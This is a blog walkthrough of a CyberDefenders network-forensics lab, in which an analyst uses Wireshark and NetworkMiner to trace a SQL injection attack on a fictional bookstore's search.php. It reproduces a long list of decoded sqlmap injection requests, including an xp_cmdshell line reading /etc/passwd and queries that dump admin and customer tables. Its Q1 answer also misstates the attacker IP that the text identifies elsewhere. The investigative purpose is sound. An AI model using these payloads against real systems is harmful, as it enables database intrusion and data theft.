---
title: Network Forensics - Web Investigation @CyberDefender
date: 2025-9-3 00:00:00 +0700
categories: [dfir, blue-teaming, cyber-defender]
tags: [digital-forensics, network-forensics]
author: <author_id>
description: Web Investigation Lab @CyberDefender Walkthrough
# toc: false # Uncomment to disable the Table of Contents in the right panel
# comments: false # Uncomment to disable comments
image: /assets/images/preview/cyberdefenders_og.png
--- 

### Scenario 
You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.

Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.

As the lead analyst in this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

### Data Collected 
- WebInvestigation.pcap ~ 29 MB in size

### Tools 
- Wireshark
- NetworkMiner

### Questions 

After ingested case data into Wireshark, you should've something like below

![pic1](assets/images/cyberdefender/webinvestigation/pic1.png)

#### Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?

> Before performing any in-depth network analysis, i suggest taking a bird's eye view of the case metadata. Wireshark is a powerful tool to examine not only deep packet inspection but also `.pcap` metadata and statistics.
{: .prompt-tip }

![pic2](assets/images/cyberdefender/webinvestigation/pic2.png)

There's actually a ton of information that could be helpful in a real incident from a network forensic perspective, such as the incident-related timestamp, or even in some cases, information like OS, network interfaces, total packets, bytes, etc.

The next step, and in my opinion the most important step before analyzing any packet payload, is to examine the packet capture file statistics. 

![pic3](assets/images/cyberdefender/webinvestigation/pic3.png)

The first information i would like to look into is **Protocol Hierarchy**, this information helps us answer several questions related to normal or abnormal protocols within your environment (e.g: if your company does not use any SMB-related services, is it worth taking a look into captured packets that contain SMB traffic? You answer it yourself). In this case, we can observe that 99% of traffic is HTTP and a few file types (PNG, GIF, etc), so it might be easy to assume we are investigating an incident related to a web server.  

The next thing we want to examine is the packet capture conversation: how many hosts were talking or connecting to this web server in our case data.  

![pic4](assets/images/cyberdefender/webinvestigation/pic4.png)

By looking into the above conversation, we'll be able to extract receivers and senders in our case. For this particular example:
- `73.124.22.98` - Victim machine, which is the web server 
- `111.224.250.131` - Sender #1, took the most traffic in our case 
- `170.40.150.126` - Sender #2 

While Wireshark is a powerful tool for packet analysis, in this case, we also want to utilize one more tool - [Network Miner](https://www.netresec.com/?page=NetworkMiner).  

> The idea behind using such a tool is that Network Miner is really good at categorizing traffic into separated useful sections such as **Detailed Host Information**, **Credentials extracted from unencrypted traffic**, etc.
{: .prompt-tip }

![pic5](assets/images/cyberdefender/webinvestigation/pic5.png)

Inspecting host details on both senders, we can determine which host is responsible for malicious activities on the web server.

![pic6](assets/images/cyberdefender/webinvestigation/pic6.png)  
_`170.40.150.126` host information, looks normal at first_

![pic7](assets/images/cyberdefender/webinvestigation/pic7.png)  
_From the user-agent string, this host has a bunch of red team/hacking tools_

Right after examining each sender's detailed information, we extracted a bunch of hacking tools that had been used by the adversary to try exploiting the web server:
- [sqlmap](https://sqlmap.org/) -> SQL mapping, scanner, commonly use for SQL injection
- [gobuster](https://github.com/OJ/gobuster) -> Directory scanner, brute forcing
- Red Team framework, in this case, [Cobalt Strike](https://www.cobaltstrike.com/) or [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/) -> Adversary Simulation Frameworks, adversary could utilize such legal frameworks for data exfiltration

> ANSWER: `111.124.250.131`
{: .prompt-info }


#### Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

Since suspicious IP Address was identified, we could extract more information relate to this IP Address via OSINT (IP Lookup, Whois, AbuseIPDB, etc)

Below is information extracted from [AbuseIPDB](https://www.abuseipdb.com/check/111.224.250.131), sender IP Address was from China, Shijiazhuang, Hebei.

![pic8](assets/images/cyberdefender/webinvestigation/pic8.png)

Worth notice in above picture is, there's no report to this IP Address so far, in many cases, we often overlook such as IP Address if rely on OSINT totally w/out any internal knowledges.

> ANSWER: `Shijiazhuang`
{: .prompt-info }

#### Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable PHP script name?

By successfully identifying adversary techniques which is SQLi via sqlmap and directory brute-forcing using gobuster, through User-Agent strings, we could narrow the traffic to the relevant flows.

In Wireshark, we could perform a filter like below:
```sql
http.user_agent contains "gobuster" || http.user_agent contains "sqlmap"
```

![pic9](assets/images/cyberdefender/webinvestigation/pic9.png)

The goal of above filter is to find the earliest packets containing either of those User-Agent strings.

There were numerous SQLi requests related to `search.php`, indicating the adversary exploited vulnerabilities in that server-side PHP script.

> ANSWER: `search.php`
{: .prompt-info }

#### Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, what is the complete request URI of the first SQLi attempt by the attacker?

This question tests us from an offensive-security point of view. If we apply the same filter used in the previous question to track down activity, we won't find the answer for this type of question.

> Question: Before adversary use their tools for automation, what action do they take first ? 
{: .prompt-tip }

If you're in a Bug Bounty role, there's a chance the researcher will find a bug first through manual testing. After confirming that a vulnerability actually exists in the system, they will use tools to automate further testing.

That's why we couldn't just analyze adversary behavior by only their tools User-Agent strings, but trace back to their very first interaction on compromised system.

So, instead of applying the previous Wireshark filter, since we've already identified the adversary's IP address and the vulnerable PHP script, we can use a filter like this:

```sql
ip.addr == 111.224.250.131 && frame contains "search.php?"
```

Mark entire output by Ctrl + Shift + M, we only want to extract relevant information to reduce noises.

![pic10](assets/images/cyberdefender/webinvestigation/pic10.png)

Now, export marked packets by using Export Packets Dissections feature in Wireshark.

![pic11](assets/images/cyberdefender/webinvestigation/pic11.png)

From now, we could utilize tool like CyberChef to decoded entire Info column which is contain main payloads to start our investigation.

![pic12](assets/images/cyberdefender/webinvestigation/pic12.png)

I'll put entire payloads below, but we definitely able to indicate first sign of SQL injection in `GET /search.php?search=book'` but completed request URI attempt was `GET /search.php?search=book and 1=1; -- -`

```sql
GET /search.php?search=test test HTTP/1.1 
GET /search.php?search=war HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' HTTP/1.1 
GET /search.php?search=book and 1=1; -- - HTTP/1.1 
GET /search.php?search=book and 1=2; -- - HTTP/1.1 
GET /search.php?search=test’ OR 1=1; -- HTTP/1.1 
GET /search.php?search=' or 1=1; -- - HTTP/1.1 
GET /search.php?search=' or 1=1; -- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book&ZscL=7696 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')# HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book)'.,)".(,) HTTP/1.1 
GET /search.php?search=book'gXdbTu<'">aiqlSR HTTP/1.1 
GET /search.php?search=book') AND 6166=6053 AND ('uTui'='uTui HTTP/1.1 
GET /search.php?search=book') AND 2714=2714 AND ('JlbN'='JlbN HTTP/1.1 
GET /search.php?search=book' AND 7459=3526 AND 'PyAo'='PyAo HTTP/1.1 
GET /search.php?search=book' AND 2714=2714 AND 'gQwm'='gQwm HTTP/1.1 
GET /search.php?search=book) AND 7525=3286 AND (2329=2329 HTTP/1.1 
GET /search.php?search=book) AND 2714=2714 AND (9471=9471 HTTP/1.1 
GET /search.php?search=book AND 3355=3625 HTTP/1.1 
GET /search.php?search=book AND 2714=2714 HTTP/1.1 
GET /search.php?search=book AND 7966=5613-- qKfa HTTP/1.1 
GET /search.php?search=book AND 2714=2714-- NYSV HTTP/1.1 
GET /search.php?search=(SELECT (CASE WHEN (5752=1273) THEN 'book' ELSE (SELECT 1273 UNION SELECT 4191) END)) HTTP/1.1 
GET /search.php?search=(SELECT (CASE WHEN (8006=8006) THEN 'book' ELSE (SELECT 3826 UNION SELECT 1335) END)) HTTP/1.1 
GET /search.php?search=book') AND EXTRACTVALUE(2785,CONCAT(0x5c,0x7178766271,(SELECT (ELT(2785=2785,1))),0x7176706a71)) AND ('UvGM'='UvGM HTTP/1.1 
GET /search.php?search=book' AND EXTRACTVALUE(2785,CONCAT(0x5c,0x7178766271,(SELECT (ELT(2785=2785,1))),0x7176706a71)) AND 'mcOy'='mcOy HTTP/1.1 
GET /search.php?search=book) AND EXTRACTVALUE(2785,CONCAT(0x5c,0x7178766271,(SELECT (ELT(2785=2785,1))),0x7176706a71)) AND (3907=3907 HTTP/1.1 
GET /search.php?search=book AND EXTRACTVALUE(2785,CONCAT(0x5c,0x7178766271,(SELECT (ELT(2785=2785,1))),0x7176706a71)) HTTP/1.1 
GET /search.php?search=book AND EXTRACTVALUE(2785,CONCAT(0x5c,0x7178766271,(SELECT (ELT(2785=2785,1))),0x7176706a71))-- Xilz HTTP/1.1 
GET /search.php?search=book') AND 4081=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4081=4081) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)) AS NUMERIC) AND ('asyT'='asyT HTTP/1.1 
GET /search.php?search=book' AND 4081=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4081=4081) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)) AS NUMERIC) AND 'QTDi'='QTDi HTTP/1.1 
GET /search.php?search=book) AND 4081=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4081=4081) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)) AS NUMERIC) AND (7256=7256 HTTP/1.1 
GET /search.php?search=book AND 4081=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4081=4081) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)) AS NUMERIC) HTTP/1.1 
GET /search.php?search=book AND 4081=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (4081=4081) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)) AS NUMERIC)-- dxSY HTTP/1.1 
GET /search.php?search=book') AND 8305 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (8305=8305) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND ('NVnd'='NVnd HTTP/1.1 
GET /search.php?search=book' AND 8305 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (8305=8305) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND 'OkNR'='OkNR HTTP/1.1 
GET /search.php?search=book) AND 8305 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (8305=8305) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND (9664=9664 HTTP/1.1 
GET /search.php?search=book AND 8305 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (8305=8305) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) HTTP/1.1 
GET /search.php?search=book AND 8305 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (8305=8305) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113)))-- GiTV HTTP/1.1 
GET /search.php?search=book') AND 4508=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4508=4508) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('xlJY'='xlJY HTTP/1.1 
GET /search.php?search=book' AND 4508=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4508=4508) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'aaDt'='aaDt HTTP/1.1 
GET /search.php?search=book) AND 4508=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4508=4508) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (1824=1824 HTTP/1.1 
GET /search.php?search=book AND 4508=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4508=4508) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) HTTP/1.1 
GET /search.php?search=book AND 4508=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4508=4508) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- mHlO HTTP/1.1 
GET /search.php?search=(SELECT CONCAT(CONCAT('qxvbq',(CASE WHEN (2162=2162) THEN '1' ELSE '0' END)),'qvpjq')) HTTP/1.1 
GET /search.php?search=book');SELECT PG_SLEEP(5)-- HTTP/1.1 
GET /search.php?search=book';SELECT PG_SLEEP(5)-- HTTP/1.1 
GET /search.php?search=book);SELECT PG_SLEEP(5)-- HTTP/1.1 
GET /search.php?search=book;SELECT PG_SLEEP(5)-- HTTP/1.1 
GET /search.php?search=book');WAITFOR DELAY '0:0:5'-- HTTP/1.1 
GET /search.php?search=book';WAITFOR DELAY '0:0:5'-- HTTP/1.1 
GET /search.php?search=book);WAITFOR DELAY '0:0:5'-- HTTP/1.1 
GET /search.php?search=book;WAITFOR DELAY '0:0:5'-- HTTP/1.1 
GET /search.php?search=book');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(82)||CHR(74)||CHR(66),5) FROM DUAL-- HTTP/1.1 
GET /search.php?search=book';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(82)||CHR(74)||CHR(66),5) FROM DUAL-- HTTP/1.1 
GET /search.php?search=book);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(82)||CHR(74)||CHR(66),5) FROM DUAL-- HTTP/1.1 
GET /search.php?search=book;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(82)||CHR(74)||CHR(66),5) FROM DUAL-- HTTP/1.1 
GET /search.php?search=book') AND (SELECT 4457 FROM (SELECT(SLEEP(5)))MVDw) AND ('IQGN'='IQGN HTTP/1.1 
GET /search.php?search=book' AND (SELECT 4457 FROM (SELECT(SLEEP(5)))MVDw) AND 'Buvg'='Buvg HTTP/1.1 
GET /search.php?search=book) AND (SELECT 4457 FROM (SELECT(SLEEP(5)))MVDw) AND (6005=6005 HTTP/1.1 
GET /search.php?search=book AND (SELECT 4457 FROM (SELECT(SLEEP(5)))MVDw) HTTP/1.1 
GET /search.php?search=book AND (SELECT 4457 FROM (SELECT(SLEEP(5)))MVDw)-- TUHH HTTP/1.1 
GET /search.php?search=book') AND 2111=(SELECT 2111 FROM PG_SLEEP(5)) AND ('MEMs'='MEMs HTTP/1.1 
GET /search.php?search=book' AND 2111=(SELECT 2111 FROM PG_SLEEP(5)) AND 'LcBZ'='LcBZ HTTP/1.1 
GET /search.php?search=book) AND 2111=(SELECT 2111 FROM PG_SLEEP(5)) AND (5552=5552 HTTP/1.1 
GET /search.php?search=book AND 2111=(SELECT 2111 FROM PG_SLEEP(5)) HTTP/1.1 
GET /search.php?search=book AND 2111=(SELECT 2111 FROM PG_SLEEP(5))-- Dtmg HTTP/1.1 
GET /search.php?search=book') WAITFOR DELAY '0:0:5' AND ('cTDN'='cTDN HTTP/1.1 
GET /search.php?search=book' WAITFOR DELAY '0:0:5' AND 'vnNu'='vnNu HTTP/1.1 
GET /search.php?search=book) WAITFOR DELAY '0:0:5' AND (6806=6806 HTTP/1.1 
GET /search.php?search=book WAITFOR DELAY '0:0:5' HTTP/1.1 
GET /search.php?search=book WAITFOR DELAY '0:0:5'-- bgLX HTTP/1.1 
GET /search.php?search=book') AND 2809=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(73)||CHR(83)||CHR(65),5) AND ('UpEj'='UpEj HTTP/1.1 
GET /search.php?search=book' AND 2809=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(73)||CHR(83)||CHR(65),5) AND 'aRuS'='aRuS HTTP/1.1 
GET /search.php?search=book) AND 2809=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(73)||CHR(83)||CHR(65),5) AND (3543=3543 HTTP/1.1 
GET /search.php?search=book AND 2809=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(73)||CHR(83)||CHR(65),5) HTTP/1.1 
GET /search.php?search=book AND 2809=DBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(73)||CHR(83)||CHR(65),5)-- CCxP HTTP/1.1 
GET /search.php?search=book') ORDER BY 1-- NZXA HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL-- gwbg HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL-- ESqS HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL-- snMT HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL-- lfOi HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- Puwm HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- lvnE HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nGqo HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NQQm HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dcBF HTTP/1.1 
GET /search.php?search=book') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WByW HTTP/1.1 
GET /search.php?search=book' ORDER BY 1-- bLuc HTTP/1.1 
GET /search.php?search=book' ORDER BY 7935-- VSWw HTTP/1.1 
GET /search.php?search=book' ORDER BY 10-- htvC HTTP/1.1 
GET /search.php?search=book' ORDER BY 6-- NVzm HTTP/1.1 
GET /search.php?search=book' ORDER BY 4-- PBGE HTTP/1.1 
GET /search.php?search=book' ORDER BY 3-- JRQE HTTP/1.1 
GET /search.php?search=book' ORDER BY 2-- bnbT HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT CONCAT(CONCAT('qxvbq','YvFTDfNFtVvUXThHhKGruGqHpjoFGbDyVsqVVnAD'),'qvpjq'),NULL-- LyUt HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq','cQaeUZfqHbHVvKfkBYvgFGwRxanuOjErmhlQSZGH'),'qvpjq')-- OWdS HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq','cQaeUZfqHbHVvKfkBYvgFGwRxanuOjErmhlQSZGH'),'qvpjq') UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq','RJUUVYBSabGHWXbwbyDMUYcNyEzeeOmPhPmeFtVy'),'qvpjq')-- wKnA HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq','cQaeUZfqHbHVvKfkBYvgFGwRxanuOjErmhlQSZGH'),'qvpjq') FROM (SELECT 0 AS BmsK UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS SkMv-- zLBA HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',(CASE WHEN (36=36) THEN '1' ELSE '0' END)),'qvpjq')-- XJZK HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',(CASE WHEN (36=69) THEN '1' ELSE '0' END)),'qvpjq')-- AmDP HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',(CASE WHEN (36=87) THEN '1' ELSE '0' END)),'qvpjq')-- BqPn HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',(CASE WHEN (87=69) THEN '1' ELSE '0' END)),'qvpjq')-- eOht HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',(CASE WHEN (69=69) THEN '1' ELSE '0' END)),'qvpjq')-- BhNd HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',(CASE WHEN (87 69) THEN '1' ELSE '0' END)),'qvpjq')-- Rpfv HTTP/1.1 
38154  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=1448 TSval=2206276580 TSecr=3931865908 [TCP PDU reassembled in 1403]
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (QUARTER(NULL XOR NULL) IS NULL) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (SESSION_USER() LIKE USER()) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7176706a71)-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,table_name)),0x7176706a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x626f6f6b776f726c645f6462)-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x637573746f6d657273 AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x626f6f6b73 AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,title)),0x7176706a71) FROM bookworld_db.books-- - HTTP/1.1 
```

> ANSWER: `/search.php?search=book and 1=1; -- -`
{: .prompt-info }

#### Q5: Can you provide the complete request URI that was used to read the web server's available databases?

By successfully indentifying improper validation that led to SQL injection, the adversary began using sqlmap to automate their exploitation attempts. 

Understand adversary tools utilities and behavior in such cases is important. For an in-depth investigation, we should examine the tool's source code itself, to understand how it behaves.

Below is a snippet [sqlmap](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) queries define per database:

**MySQL**:
```xml
<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        ...
        <dbs>
            <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA" query2="SELECT db FROM mysql.db"/>
            <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1" query2="SELECT DISTINCT(db) FROM mysql.db LIMIT %d,1" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db"/>
        </dbs>
        <tables>
            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES" query2="SELECT database_name,table_name FROM mysql.innodb_table_stats" condition="table_schema" condition2="database_name"/>
            <blind query="SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' LIMIT %d,1" query2="SELECT table_name FROM mysql.innodb_table_stats WHERE database_name='%s' LIMIT %d,1" count="SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" count2="SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name='%s'"/>
        </tables>
        <columns>
            <inband query="SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
            <blind query="SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" query2="SELECT column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND column_name='%s' AND table_schema='%s'" count="SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
        </columns>
        ....
```

**PostgreSQL**
```xml
    <dbms value="PostgreSQL">
        <cast query="CAST(%s AS VARCHAR(10000))"/>
        <length query="LENGTH(%s)"/>
        <!-- NOTE: PostgreSQL does not like COALESCE with different data-types (e.g. COALESCE(id,' ')) -->
        ...
        <dbs>
            <inband query="SELECT DISTINCT(schemaname) FROM pg_tables"/>
            <blind query="SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET %d LIMIT 1" count="SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables"/>
        </dbs>
        <tables>
